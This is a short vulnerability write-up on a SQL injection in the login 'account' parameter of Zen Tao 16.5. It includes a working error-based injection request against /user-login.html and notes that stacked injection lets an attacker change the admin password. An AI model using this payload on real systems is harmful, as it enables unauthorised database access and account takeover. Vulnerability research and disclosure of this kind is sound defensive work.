# Zen Tao 16.5 router.class.php SQL injection vulnerability

## Vulnerability Description

Zen Tao 16.5 There is a SQL injection vulnerability in the router. Class.php file. The attacker can obtain sensitive database information through the vulnerability, endangering the security of the server.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Zen Tao 16.5</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1651845742331-80eb4af4-3ecb-465a-b9f4-6b9f211bce3a.png)

`16.5 to 16.5.1 versions` updated the `framework/base/router.class.php` file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1651970702476-e791e909-c6ad-4386-a9ed-bd0f93454d92.png)

`account parameter` uses the `quote method` to filter SQL statements

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1651971046505-0dfe20a0-ed9b-4704-a233-fbf1967c0248.png)

You can see that this method mainly adds escape to fields, so it can be inferred that SQL injection exists in version 16.5, and tracks debugging and testing SQL injection

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1651971584690-5654e6cd-48ca-4f5e-a552-7c6d6648f968.png)

Verify the POC as follows, where stack injection also exists, and the administrator password can be modified through SQL statements, etc.

```java
POST /user-login.html

account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1651845951752-a3b596a1-d07e-4283-9373-64f5d4c95f87.png)